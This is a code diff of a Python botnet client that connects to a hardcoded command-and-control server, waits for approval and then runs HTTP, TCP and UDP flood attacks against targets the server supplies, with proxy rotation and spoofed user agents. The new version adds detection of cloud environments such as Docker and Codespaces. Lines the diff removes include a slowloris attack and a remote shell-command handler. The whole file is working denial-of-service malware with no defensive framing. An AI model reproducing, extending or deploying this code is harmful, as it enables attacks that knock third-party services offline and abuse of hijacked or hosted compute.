@@ -3,7 +3,6 @@ import time
 import sys
 import uuid
 import hashlib
-import subprocess
 import os
 import socket
 import random
@@ -11,8 +10,6 @@ import struct
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
-import http.client
-import json
 
 try:
     import requests
@@ -23,7 +20,6 @@ except ImportError:
     print("[!] Install requests: pip install requests")
     exit(1)
 
-# Try to import optional dependencies
 try:
     import psutil
 except ImportError:
@@ -31,43 +27,43 @@ except ImportError:
     print("[!] Warning: psutil not available - limited system monitoring")
 
 
-class PowerfulTermuxBot:
+class EnhancedBot:
     def __init__(self):
+        # Auto-connect configuration
+        self.server_url = "https://c2-server-io.onrender.com"
+        
         self.bot_id = self.generate_bot_id()
         self.running = True
-        self.server_url = None
         self.approved = False
         self.active_attacks = []
         self.attack_lock = threading.Lock()
         self.connection_retries = 0
-        self.max_retry_delay = 300  # Max 5 minutes between retries
+        self.max_retry_delay = 300
         
-        # Session pool for keep-alive and connection reuse
+        # Session pool for performance
         self.session_pool = []
-        self.pool_size = 50
+        self.pool_size = 30
         self.init_session_pool()
         
-        # Enhanced system specs for Termux
+        # System specs
         self.specs = {
             'bot_id': self.bot_id,
             'cpu_cores': self.get_cpu_count(),
             'cpu_freq': self.get_cpu_freq(),
             'ram_gb': self.get_ram_gb(),
             'ram_available': self.get_ram_available(),
-            'os': 'termux-android' if self.is_termux() else sys.platform,
+            'os': self.detect_environment(),
             'hostname': socket.gethostname(),
             'network_interfaces': self.get_network_info(),
             'capabilities': {
                 'http': True,
                 'tcp': True,
                 'udp': True,
-                'slowloris': True,
-                'high_performance': True,
-                'session_pooling': True
+                'resource_optimized': True,
+                'auto_connect': True
             }
         }
         
-        # Attack stats
         self.stats = {
             'total_attacks': 0,
             'successful_attacks': 0,
@@ -78,17 +74,14 @@ class PowerfulTermuxBot:
         self.display_banner()
     
     def init_session_pool(self):
-        """Create pool of reusable sessions for maximum speed"""
+        """Create pool of reusable sessions"""
         for _ in range(self.pool_size):
             session = requests.Session()
-            
-            # Disable SSL verification for speed
             session.verify = False
             
-            # Configure adapter for keep-alive
             adapter = HTTPAdapter(
-                pool_connections=100,
-                pool_maxsize=100,
+                pool_connections=50,
+                pool_maxsize=50,
                 max_retries=0,
                 pool_block=False
             )
@@ -101,12 +94,21 @@ class PowerfulTermuxBot:
         """Get a session from the pool"""
         return random.choice(self.session_pool)
     
-    def is_termux(self):
-        """Check if running in Termux"""
-        return os.path.exists('/data/data/com.termux')
+    def detect_environment(self):
+        """Detect if running in cloud environment"""
+        if os.path.exists('/.dockerenv'):
+            return 'docker'
+        elif 'CODESPACE_NAME' in os.environ:
+            return 'github-codespaces'
+        elif 'CLOUD_SHELL' in os.environ:
+            return 'google-cloud-shell'
+        elif os.path.exists('/data/data/com.termux'):
+            return 'termux-android'
+        else:
+            return sys.platform
     
     def get_cpu_count(self):
-        """Get CPU count (Termux compatible)"""
+        """Get CPU count"""
         try:
             if psutil:
                 return psutil.cpu_count()
@@ -117,7 +119,7 @@ class PowerfulTermuxBot:
             return os.cpu_count() or 4
     
     def get_cpu_freq(self):
-        """Get CPU frequency (Termux compatible)"""
+        """Get CPU frequency"""
         try:
             if psutil and psutil.cpu_freq():
                 return round(psutil.cpu_freq().max, 2)
@@ -128,7 +130,7 @@ class PowerfulTermuxBot:
             return 0.0
     
     def get_ram_gb(self):
-        """Get total RAM (Termux compatible)"""
+        """Get total RAM"""
         try:
             if psutil:
                 return round(psutil.virtual_memory().total / (1024**3), 1)
@@ -142,7 +144,7 @@ class PowerfulTermuxBot:
             return 0.0
     
     def get_ram_available(self):
-        """Get available RAM (Termux compatible)"""
+        """Get available RAM"""
         try:
             if psutil:
                 return round(psutil.virtual_memory().available / (1024**3), 1)
@@ -158,14 +160,12 @@ class PowerfulTermuxBot:
     def check_internet_connection(self):
         """Check if internet is available"""
         try:
-            # Try to connect to common DNS servers
             socket.create_connection(("8.8.8.8", 53), timeout=3)
             return True
         except OSError:
             pass
         
         try:
-            # Try Google as fallback
             socket.create_connection(("www.google.com", 80), timeout=3)
             return True
         except OSError:
@@ -175,46 +175,44 @@ class PowerfulTermuxBot:
     
     def wait_for_internet(self):
         """Wait until internet connection is available"""
-        print(f"\n[\033[1;31m✗\033[0m] No internet connection detected")
-        print(f"[\033[1;33m⏳\033[0m] Waiting for internet connection...")
+        print("\n[X] No internet connection detected")
+        print("[...] Waiting for internet connection...")
         
-        dots = 0
         while not self.check_internet_connection():
-            dots = (dots + 1) % 4
-            print(f"\r[\033[1;33m...\033[0m] Checking connection" + "."*dots + " "*10, end='')
+            print("\r[...] Checking connection...", end='')
             time.sleep(5)
         
-        print(f"\n[\033[1;32m✓\033[0m] Internet connection restored!")
+        print("\n[OK] Internet connection restored!")
         time.sleep(2)
         
     def calculate_retry_delay(self):
         """Calculate exponential backoff delay"""
-        # Exponential backoff: 5s, 10s, 20s, 40s, 80s, up to max_retry_delay
         delay = min(5 * (2 ** self.connection_retries), self.max_retry_delay)
         return delay
         
     def display_banner(self):
-        """Display enhanced bot information"""
-        print("\n" + "╔" + "═"*58 + "╗")
-        print("║" + " "*10 + "\033[1;31mPOWERFUL TERMUX BOTNET v3.1\033[0m" + " "*17 + "║")
-        print("╚" + "═"*58 + "╝")
-        print(f"\n[\033[1;32m+\033[0m] BOT ID: \033[1;31m{self.bot_id}\033[0m")
-        print(f"[\033[1;32m+\033[0m] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
-        print(f"[\033[1;32m+\033[0m] RAM: {self.specs['ram_gb']}GB (Available: {self.specs['ram_available']}GB)")
-        print(f"[\033[1;32m+\033[0m] OS: {self.specs['os']}")
-        print(f"[\033[1;32m+\033[0m] Session Pool: {self.pool_size} connections")
-        
-        print(f"\n[\033[1;36m*\033[0m] POWER FEATURES:")
-        print(f"    \033[1;32m✓\033[0m MULTI-THREADED ATTACKS")
-        print(f"    \033[1;32m✓\033[0m CONNECTION POOLING")
-        print(f"    \033[1;32m✓\033[0m KEEP-ALIVE OPTIMIZATION")
-        print(f"    \033[1;32m✓\033[0m ZERO-DELAY REQUESTS")
-        print(f"    \033[1;32m✓\033[0m RAW SOCKET FLOODS")
-        print(f"    \033[1;32m✓\033[0m AUTO-RECONNECT ON DISCONNECT")
-        
+        """Display bot information"""
         print("\n" + "="*60)
-        print("COPY YOUR BOT ID AND ADD IT IN THE SERVER DASHBOARD")
-        print("="*60 + "\n")
+        print("  ENHANCED BOT CLIENT v3.0")
+        print("="*60)
+        print(f"\n[+] BOT ID: {self.bot_id}")
+        print(f"[+] CPU: {self.specs['cpu_cores']} cores @ {self.specs['cpu_freq']}MHz")
+        print(f"[+] RAM: {self.specs['ram_gb']}GB (Available: {self.specs['ram_available']}GB)")
+        print(f"[+] Environment: {self.specs['os']}")
+        print(f"[+] Session Pool: {self.pool_size} connections")
+        print(f"[+] Auto-Connect: ENABLED")
+        print(f"[+] Server: {self.server_url}")
+        
+        print(f"\n[*] FEATURES:")
+        print(f"    [OK] RESOURCE OPTIMIZED (50-300 threads)")
+        print(f"    [OK] MULTI-THREADED ATTACKS")
+        print(f"    [OK] CONNECTION POOLING")
+        print(f"    [OK] CUSTOM USER AGENTS FROM SERVER")
+        print(f"    [OK] OPTIONAL PROXY SUPPORT")
+        print(f"    [OK] AUTO-RECONNECT ON DISCONNECT")
+        print(f"    [OK] CLOUD ENVIRONMENT COMPATIBLE")
+        
+        print("\n" + "="*60 + "\n")
         
     def generate_bot_id(self):
         """Generate unique bot ID"""
@@ -242,20 +240,12 @@ class PowerfulTermuxBot:
         except:
             return []
     
-    def get_server_url(self):
-        """Get server URL from user"""
-        print("[\033[1;33m?\033[0m] Enter C2 Server URL:")
-        print("    Examples:")
-        print("    • http://localhost:5000")
-        print("    • http://192.168.1.100:5000")
-        print("    • http://your-server.com:5000")
-        print("    Or press ENTER for default (https://c2-server-io.onrender.com)")
-        url = input("\n\033[1;36m>>>\033[0m ").strip()
-        
-        if not url:
-            url = "https://c2-server-io.onrender.com"
-        
-        return url.rstrip('/')
+    def check_cpu_usage(self):
+        """Check current CPU usage to prevent overload"""
+        if psutil:
+            cpu_percent = psutil.cpu_percent(interval=0.5)
+            return cpu_percent < 90  # Don't overload if CPU is above 90%
+        return True
     
     def check_approval(self):
         """Check if bot is approved"""
@@ -273,10 +263,10 @@ class PowerfulTermuxBot:
             )
             if response.status_code == 200:
                 result = response.json()
-                self.connection_retries = 0  # Reset retry counter on success
+                self.connection_retries = 0
                 return result.get('approved', False)
         except requests.exceptions.RequestException:
-            raise  # Re-raise to handle in caller
+            raise
         except:
             pass
         return False
@@ -290,16 +280,16 @@ class PowerfulTermuxBot:
                 verify=False
             )
             if response.status_code == 200:
-                self.connection_retries = 0  # Reset retry counter on success
+                self.connection_retries = 0
                 return response.json().get('commands', [])
         except requests.exceptions.RequestException:
-            raise  # Re-raise to handle in caller
+            raise
         except:
             pass
         return []
     
     def send_status(self, status, message):
-        """Send enhanced status update"""
+        """Send status update"""
         try:
             self.stats['uptime'] = int(time.time() - self.stats['uptime'])
             
@@ -316,16 +306,35 @@ class PowerfulTermuxBot:
                 timeout=5,
                 verify=False
             )
-            self.connection_retries = 0  # Reset retry counter on success
+            self.connection_retries = 0
         except:
             pass
+    
+    def get_proxy_dict(self, proxy_str):
+        """Convert proxy string to requests proxy dict"""
+        if not proxy_str:
+            return None
+        
+        try:
+            if '@' in proxy_str:
+                auth, address = proxy_str.split('@')
+                proxy_url = f"http://{auth}@{address}"
+            else:
+                proxy_url = f"http://{proxy_str}"
+            
+            return {
+                'http': proxy_url,
+                'https': proxy_url
+            }
+        except:
+            return None
     
     def execute_command(self, cmd):
         """Execute command"""
         cmd_type = cmd.get('type')
         
         print(f"\n{'='*60}")
-        print(f"[\033[1;36m→\033[0m] COMMAND: \033[1;33m{cmd_type}\033[0m")
+        print(f"[->] COMMAND: {cmd_type}")
         print(f"{'='*60}")
         
         try:
@@ -337,42 +346,49 @@ class PowerfulTermuxBot:
                 self.cmd_tcp_flood(cmd)
             elif cmd_type == 'udp_flood':
                 self.cmd_udp_flood(cmd)
-            elif cmd_type == 'slowloris':
-                self.cmd_slowloris(cmd)
-            elif cmd_type == 'shell':
-                self.cmd_shell(cmd)
             elif cmd_type == 'sysinfo':
                 self.cmd_sysinfo()
             elif cmd_type == 'stop_all':
                 self.cmd_stop_all()
             else:
-                print(f"[\033[1;31m!\033[0m] Unknown: {cmd_type}")
+                print(f"[!] Unknown command: {cmd_type}")
                 
         except Exception as e:
-            print(f"[\033[1;31m!\033[0m] Error: {e}")
+            print(f"[!] Error: {e}")
             self.send_status('error', str(e))
     
     def cmd_ping(self):
         """Respond to ping"""
         self.send_status('success', 'pong')
-        print("[\033[1;32m✓\033[0m] Pong!")
+        print("[OK] Pong!")
     
     def cmd_http_flood(self, cmd):
-        """MAXIMUM SPEED HTTP FLOOD - NO DELAYS"""
+        """OPTIMIZED HTTP FLOOD - Resource Friendly"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 200)  # Use threads from server
+        threads = cmd.get('threads', 100)
         method = cmd.get('method', 'GET').upper()
+        user_agents = cmd.get('user_agents', [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ])
+        proxies = cmd.get('proxies', [])
         
-        print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED HTTP FLOOD\033[0m")
+        # Limit threads based on CPU to prevent overload
+        max_threads = min(threads, 300)
+        if not self.check_cpu_usage():
+            max_threads = min(max_threads, 100)
+            print("[!] High CPU usage detected, limiting threads to 100")
+        
+        print(f"[*] OPTIMIZED HTTP FLOOD")
         print(f"    Target: {target}")
         print(f"    Method: {method}")
         print(f"    Duration: {duration}s")
-        print(f"    Threads: {threads}")
-        print(f"    Mode: \033[1;31mMAXIMUM SPEED (NO DELAYS)\033[0m")
+        print(f"    Threads: {max_threads}")
+        print(f"    User Agents: {len(user_agents)}")
+        print(f"    Proxies: {len(proxies) if proxies else 'None'}")
         
         self.stats['total_attacks'] += 1
-        self.send_status('running', f'{method} SPEED FLOOD: {target}')
+        self.send_status('running', f'{method} FLOOD: {target}')
         
         attack_id = f"http_{int(time.time())}"
         with self.attack_lock:
@@ -381,18 +397,16 @@ class PowerfulTermuxBot:
         request_count = [0]
         success_count = [0]
         
-        user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
-        ]
-        
-        def speed_flood_worker():
-            """EXTREME SPEED - NO DELAYS, NO TIMEOUTS"""
+        def flood_worker():
+            """Optimized flood worker with rate limiting"""
             end_time = time.time() + duration
             session = self.get_session()
+            
+            # Select proxy if available
+            proxy_dict = None
+            if proxies:
+                proxy_str = random.choice(proxies)
+                proxy_dict = self.get_proxy_dict(proxy_str)
             
             while time.time() < end_time and attack_id in self.active_attacks:
                 try:
@@ -403,40 +417,41 @@ class PowerfulTermuxBot:
                         'Cache-Control': 'no-cache'
                     }
                     
-                    # Add random query params
                     params = {
-                        '_': str(int(time.time() * 1000000)),  # Microsecond timestamp
-                        'r': random.randint(1, 9999999),
-                        'c': random.randint(1, 9999999)
+                        '_': str(int(time.time() * 1000000)),
+                        'r': random.randint(1, 9999999)
                     }
                     
                     if method == 'GET':
-                        r = session.get(target, headers=headers, params=params, timeout=3, verify=False)
+                        r = session.get(target, headers=headers, params=params, 
+                                      timeout=3, verify=False, proxies=proxy_dict)
                     elif method == 'POST':
-                        payload = {'data': 'x' * random.randint(100, 2000)}
-                        r = session.post(target, headers=headers, data=payload, timeout=3, verify=False)
+                        payload = {'data': 'x' * random.randint(100, 1000)}
+                        r = session.post(target, headers=headers, data=payload, 
+                                       timeout=3, verify=False, proxies=proxy_dict)
                     elif method == 'HEAD':
-                        r = session.head(target, headers=headers, params=params, timeout=3, verify=False)
+                        r = session.head(target, headers=headers, params=params, 
+                                       timeout=3, verify=False, proxies=proxy_dict)
                     else:
-                        r = session.get(target, headers=headers, params=params, timeout=3, verify=False)
+                        r = session.get(target, headers=headers, params=params, 
+                                      timeout=3, verify=False, proxies=proxy_dict)
                     
                     request_count[0] += 1
                     if r.status_code < 500:
                         success_count[0] += 1
-                        
-                    # ZERO DELAY - SPAM AS FAST AS POSSIBLE
+                    
+                    # Small delay to prevent CPU overload (0.001s = 1000 req/s per thread)
+                    time.sleep(0.001)
                     
                 except:
                     request_count[0] += 1
-                    # Continue immediately on error
+                    time.sleep(0.01)
         
-        # Launch massive thread pool
-        print(f"[\033[1;32m+\033[0m] Launching {threads} attack threads...")
+        print(f"[+] Launching {max_threads} attack threads...")
         
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(speed_flood_worker) for _ in range(threads)]
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = [executor.submit(flood_worker) for _ in range(max_threads)]
             
-            # Monitor with live stats
             start = time.time()
             last_count = 0
             
@@ -445,11 +460,11 @@ class PowerfulTermuxBot:
                 elapsed = time.time() - start
                 
                 current = request_count[0]
-                rps = (current - last_count)  # Requests in last second
+                rps = (current - last_count)
                 avg_rps = current / elapsed if elapsed > 0 else 0
                 
-                print(f"\r[\033[1;31m⚡\033[0m] Total: {current:,} | "
-                      f"RPS: \033[1;33m{rps:,}\033[0m | "
+                print(f"\r[>>] Total: {current:,} | "
+                      f"RPS: {rps:,} | "
                       f"Avg: {avg_rps:.0f} | "
                       f"Success: {success_count[0]:,}", end='')
                 
@@ -459,16 +474,21 @@ class PowerfulTermuxBot:
                 if attack_id in self.active_attacks:
                     self.active_attacks.remove(attack_id)
         
-        print(f"\n[\033[1;32m✓\033[0m] FLOOD COMPLETE: \033[1;31m{request_count[0]:,}\033[0m requests sent!")
+        print(f"\n[OK] FLOOD COMPLETE: {request_count[0]:,} requests sent!")
         self.stats['total_requests'] += request_count[0]
         self.stats['successful_attacks'] += 1
-        self.send_status('success', f'Speed flood: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
+        self.send_status('success', f'Flood: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
     
     def cmd_tcp_flood(self, cmd):
-        """HIGH-SPEED TCP FLOOD"""
+        """OPTIMIZED TCP FLOOD"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 100)  # Use threads from server
+        threads = cmd.get('threads', 75)
+        
+        # Limit threads to prevent overload
+        max_threads = min(threads, 200)
+        if not self.check_cpu_usage():
+            max_threads = min(max_threads, 75)
         
         if ':' in target:
             host, port = target.split(':')
@@ -477,13 +497,13 @@ class PowerfulTermuxBot:
             host = target
             port = 80
         
-        print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED TCP FLOOD\033[0m")
+        print(f"[*] OPTIMIZED TCP FLOOD")
         print(f"    Target: {host}:{port}")
         print(f"    Duration: {duration}s")
-        print(f"    Threads: {threads}")
+        print(f"    Threads: {max_threads}")
         
         self.stats['total_attacks'] += 1
-        self.send_status('running', f'TCP SPEED FLOOD: {host}:{port}')
+        self.send_status('running', f'TCP FLOOD: {host}:{port}')
         
         attack_id = f"tcp_{int(time.time())}"
         with self.attack_lock:
@@ -491,8 +511,8 @@ class PowerfulTermuxBot:
         
         request_count = [0]
         
-        def tcp_speed_worker():
-            """Rapid TCP connections"""
+        def tcp_worker():
+            """TCP worker with rate limiting"""
             end_time = time.time() + duration
             
             while time.time() < end_time and attack_id in self.active_attacks:
@@ -501,38 +521,43 @@ class PowerfulTermuxBot:
                     sock.settimeout(1)
                     sock.connect((host, port))
                     
-                    # Send junk data
-                    payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(512)
+                    payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(256)
                     sock.send(payload)
                     sock.close()
                     
                     request_count[0] += 1
-                    # NO DELAY
+                    time.sleep(0.01)  # Prevent overload
                 except:
                     request_count[0] += 1
+                    time.sleep(0.05)
         
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(tcp_speed_worker) for _ in range(threads)]
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = [executor.submit(tcp_worker) for _ in range(max_threads)]
             
             start = time.time()
             while time.time() - start < duration:
                 time.sleep(1)
-                print(f"\r[\033[1;31m⚡\033[0m] TCP Connections: {request_count[0]:,}", end='')
+                print(f"\r[>>] TCP Connections: {request_count[0]:,}", end='')
             
             with self.attack_lock:
                 if attack_id in self.active_attacks:
                     self.active_attacks.remove(attack_id)
         
-        print(f"\n[\033[1;32m✓\033[0m] TCP flood: {request_count[0]:,} connections")
+        print(f"\n[OK] TCP flood: {request_count[0]:,} connections")
         self.stats['total_requests'] += request_count[0]
         self.stats['successful_attacks'] += 1
         self.send_status('success', f'TCP flood: {request_count[0]:,} conn')
     
     def cmd_udp_flood(self, cmd):
-        """HIGH-SPEED UDP FLOOD"""
+        """OPTIMIZED UDP FLOOD"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
-        threads = cmd.get('threads', 100)  # Use threads from server
+        threads = cmd.get('threads', 75)
+        
+        # Limit threads to prevent overload
+        max_threads = min(threads, 200)
+        if not self.check_cpu_usage():
+            max_threads = min(max_threads, 75)
         
         if ':' in target:
             host, port = target.split(':')
@@ -541,13 +566,13 @@ class PowerfulTermuxBot:
             host = target
             port = 53
         
-        print(f"[\033[1;36m*\033[0m] \033[1;31mHIGH-SPEED UDP FLOOD\033[0m")
+        print(f"[*] OPTIMIZED UDP FLOOD")
         print(f"    Target: {host}:{port}")
         print(f"    Duration: {duration}s")
-        print(f"    Threads: {threads}")
+        print(f"    Threads: {max_threads}")
         
         self.stats['total_attacks'] += 1
-        self.send_status('running', f'UDP SPEED FLOOD: {host}:{port}')
+        self.send_status('running', f'UDP FLOOD: {host}:{port}')
         
         attack_id = f"udp_{int(time.time())}"
         with self.attack_lock:
@@ -555,124 +580,38 @@ class PowerfulTermuxBot:
         
         request_count = [0]
         
-        def udp_speed_worker():
-            """Rapid UDP packets"""
+        def udp_worker():
+            """UDP worker with rate limiting"""
             end_time = time.time() + duration
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
             while time.time() < end_time and attack_id in self.active_attacks:
                 try:
-                    # Large random payload
-                    payload = os.urandom(random.randint(1024, 4096))
+                    payload = os.urandom(random.randint(512, 2048))
                     sock.sendto(payload, (host, port))
                     request_count[0] += 1
-                    # NO DELAY - MAXIMUM SPEED
+                    time.sleep(0.001)  # Prevent overload
                 except:
                     pass
             
             sock.close()
         
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [executor.submit(udp_speed_worker) for _ in range(threads)]
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = [executor.submit(udp_worker) for _ in range(max_threads)]
             
             start = time.time()
             while time.time() - start < duration:
                 time.sleep(1)
-                print(f"\r[\033[1;31m⚡\033[0m] UDP Packets: {request_count[0]:,}", end='')
+                print(f"\r[>>] UDP Packets: {request_count[0]:,}", end='')
             
             with self.attack_lock:
                 if attack_id in self.active_attacks:
                     self.active_attacks.remove(attack_id)
         
-        print(f"\n[\033[1;32m✓\033[0m] UDP flood: {request_count[0]:,} packets")
+        print(f"\n[OK] UDP flood: {request_count[0]:,} packets")
         self.stats['total_requests'] += request_count[0]
         self.stats['successful_attacks'] += 1
         self.send_status('success', f'UDP flood: {request_count[0]:,} packets')
-    
-    def cmd_slowloris(self, cmd):
-        """Slowloris attack"""
-        target = cmd['target']
-        duration = cmd.get('duration', 60)
-        sockets_count = cmd.get('sockets', 300)  # Use sockets from server
-        
-        parsed = urlparse(target if '://' in target else 'http://' + target)
-        host = parsed.hostname
-        port = parsed.port or 80
-        
-        print(f"[\033[1;36m*\033[0m] Slowloris Attack")
-        print(f"    Target: {host}:{port}")
-        print(f"    Duration: {duration}s")
-        print(f"    Sockets: {sockets_count}")
-        
-        self.stats['total_attacks'] += 1
-        self.send_status('running', f'Slowloris: {host}:{port}')
-        
-        attack_id = f"slow_{int(time.time())}"
-        with self.attack_lock:
-            self.active_attacks.append(attack_id)
-        
-        sockets_list = []
-        
-        def create_socket():
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                s.connect((host, port))
-                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
-                s.send(f"Host: {host}\r\n".encode())
-                s.send("User-Agent: Mozilla/5.0\r\n".encode())
-                return s
-            except:
-                return None
-        
-        for _ in range(sockets_count):
-            s = create_socket()
-            if s:
-                sockets_list.append(s)
-        
-        print(f"[\033[1;32m✓\033[0m] Created {len(sockets_list)} sockets")
-        
-        end_time = time.time() + duration
-        while time.time() < end_time and attack_id in self.active_attacks:
-            for s in list(sockets_list):
-                try:
-                    s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
-                except:
-                    sockets_list.remove(s)
-                    new_s = create_socket()
-                    if new_s:
-                        sockets_list.append(new_s)
-            
-            print(f"\r[\033[1;36m→\033[0m] Active: {len(sockets_list)}", end='')
-            time.sleep(10)
-        
-        for s in sockets_list:
-            try:
-                s.close()
-            except:
-                pass
-        
-        with self.attack_lock:
-            if attack_id in self.active_attacks:
-                self.active_attacks.remove(attack_id)
-        
-        print(f"\n[\033[1;32m✓\033[0m] Slowloris done")
-        self.stats['successful_attacks'] += 1
-        self.send_status('success', 'Slowloris complete')
-    
-    def cmd_shell(self, cmd):
-        """Execute shell command"""
-        command = cmd.get('command')
-        print(f"[\033[1;36m*\033[0m] Shell: {command}")
-        
-        try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
-            output = result.decode('utf-8', errors='ignore')[:500]
-            print(f"[\033[1;32m+\033[0m] Output:\n{output}")
-            self.send_status('success', output)
-        except Exception as e:
-            print(f"[\033[1;31m!\033[0m] Error: {e}")
-            self.send_status('error', str(e))
     
     def cmd_sysinfo(self):
         """System info"""
@@ -691,91 +630,82 @@ class PowerfulTermuxBot:
         info_lines.append(f"Total Requests: {self.stats['total_requests']:,}")
         
         info = '\n'.join(info_lines)
-        print(f"[\033[1;36m*\033[0m] System:\n{info}")
+        print(f"[*] System Info:\n{info}")
         self.send_status('success', info)
     
     def cmd_stop_all(self):
         """Stop all attacks"""
-        print(f"[\033[1;33m!\033[0m] Stopping...")
+        print(f"[!] Stopping all attacks...")
         
         with self.attack_lock:
             count = len(self.active_attacks)
             self.active_attacks.clear()
         
-        print(f"[\033[1;32m✓\033[0m] Stopped {count} attacks")
+        print(f"[OK] Stopped {count} attacks")
         self.send_status('success', f'Stopped {count}')
     
     def run(self):
         """Main loop with auto-reconnect"""
-        self.server_url = self.get_server_url()
-        
         while self.running:
             try:
                 # Check internet connection first
                 if not self.check_internet_connection():
                     self.wait_for_internet()
-                    self.connection_retries = 0  # Reset retries after internet restored
+                    self.connection_retries = 0
                 
-                print(f"\n[\033[1;36m*\033[0m] Server: {self.server_url}")
-                print(f"[\033[1;36m*\033[0m] Waiting for approval...\n")
+                print(f"\n[*] Connecting to server: {self.server_url}")
+                print(f"[*] Waiting for auto-approval...\n")
                 
                 # Wait for approval with reconnect logic
-                dots = 0
                 self.approved = False
                 
                 while not self.approved:
                     try:
-                        # Check internet before attempting connection
                         if not self.check_internet_connection():
                             self.wait_for_internet()
                             continue
                         
                         if self.check_approval():
                             self.approved = True
-                            print("\n\n" + "="*60)
-                            print("\033[1;32m✓ BOT APPROVED! READY FOR ATTACKS\033[0m")
+                            print("\n" + "="*60)
+                            print("  BOT APPROVED! READY FOR OPERATIONS")
                             print("="*60 + "\n")
                             break
                         else:
-                            dots = (dots + 1) % 4
-                            print(f"[\033[1;33m...\033[0m] Waiting (ID: \033[1;31m{self.bot_id}\033[0m)" + "."*dots + " "*10, end='\r')
+                            print(f"[...] Waiting for approval (ID: {self.bot_id})...", end='\r')
                             time.sleep(5)
                             
                     except requests.exceptions.RequestException as e:
-                        # Connection error - implement retry with backoff
                         self.connection_retries += 1
                         delay = self.calculate_retry_delay()
                         
-                        print(f"\n[\033[1;31m✗\033[0m] Connection lost: {type(e).__name__}")
-                        print(f"[\033[1;33m⏳\033[0m] Retry {self.connection_retries} - Waiting {delay}s before reconnecting...")
+                        print(f"\n[X] Connection lost: {type(e).__name__}")
+                        print(f"[...] Retry {self.connection_retries} - Waiting {delay}s before reconnecting...")
                         
-                        # Wait with countdown
                         for remaining in range(delay, 0, -1):
                             if not self.check_internet_connection():
                                 self.wait_for_internet()
                                 break
-                            print(f"\r[\033[1;33m...\033[0m] Reconnecting in {remaining}s" + " "*20, end='')
+                            print(f"\r[...] Reconnecting in {remaining}s", end='')
                             time.sleep(1)
                         
-                        print(f"\n[\033[1;36m↻\033[0m] Attempting to reconnect...")
+                        print(f"\n[->] Attempting to reconnect...")
                         
                     except KeyboardInterrupt:
-                        print("\n[\033[1;31m!\033[0m] Exiting...")
+                        print("\n[!] Exiting...")
                         return
                     except Exception as e:
-                        print(f"\n[\033[1;31m!\033[0m] Error: {e}")
+                        print(f"\n[!] Error: {e}")
                         time.sleep(10)
                 
-                print(f"[\033[1;32m+\033[0m] Active. Listening...\n")
+                print(f"[+] Active. Listening for commands...\n")
                 
                 # Main command loop with reconnect
                 while self.running and self.approved:
                     try:
-                        # Check internet periodically
                         if not self.check_internet_connection():
-                            print(f"\n[\033[1;31m✗\033[0m] Internet connection lost during operation")
+                            print(f"\n[X] Internet connection lost")
                             self.wait_for_internet()
-                            # Break to outer loop to re-establish server connection
                             self.approved = False
                             break
                         
@@ -786,56 +716,50 @@ class PowerfulTermuxBot:
                         time.sleep(5)
                         
                     except requests.exceptions.RequestException as e:
-                        # Connection error during operation
                         self.connection_retries += 1
                         delay = self.calculate_retry_delay()
                         
-                        print(f"\n[\033[1;31m✗\033[0m] Lost connection to C2 server: {type(e).__name__}")
-                        print(f"[\033[1;33m⏳\033[0m] Retry {self.connection_retries} - Waiting {delay}s...")
+                        print(f"\n[X] Lost connection to C2 server: {type(e).__name__}")
+                        print(f"[...] Retry {self.connection_retries} - Waiting {delay}s...")
                         
-                        # Wait with countdown
                         for remaining in range(delay, 0, -1):
                             if not self.check_internet_connection():
                                 self.wait_for_internet()
                                 break
-                            print(f"\r[\033[1;33m...\033[0m] Reconnecting in {remaining}s" + " "*20, end='')
+                            print(f"\r[...] Reconnecting in {remaining}s", end='')
                             time.sleep(1)
                         
-                        print(f"\n[\033[1;36m↻\033[0m] Attempting to reconnect...")
-                        
-                        # Break to outer loop to re-establish connection
+                        print(f"\n[->] Attempting to reconnect...")
                         self.approved = False
                         break
                         
                     except KeyboardInterrupt:
-                        print("\n[\033[1;31m!\033[0m] Stopping...")
+                        print("\n[!] Stopping...")
                         self.cmd_stop_all()
                         self.running = False
                         return
                         
                     except Exception as e:
-                        print(f"\n[\033[1;31m!\033[0m] Error: {e}")
+                        print(f"\n[!] Error: {e}")
                         time.sleep(10)
                 
             except KeyboardInterrupt:
-                print("\n[\033[1;31m!\033[0m] Exiting...")
+                print("\n[!] Exiting...")
                 self.running = False
                 return
 
 
 if __name__ == '__main__':
-    print("\n╔" + "═"*58 + "╗")
-    print("║" + " "*12 + "\033[1;31mPOWERFUL TERMUX BOTNET\033[0m" + " "*20 + "║")
-    print("╚" + "═"*58 + "╝")
+    print("\n" + "="*60)
+    print("  ENHANCED BOT CLIENT - AUTO CONNECT")
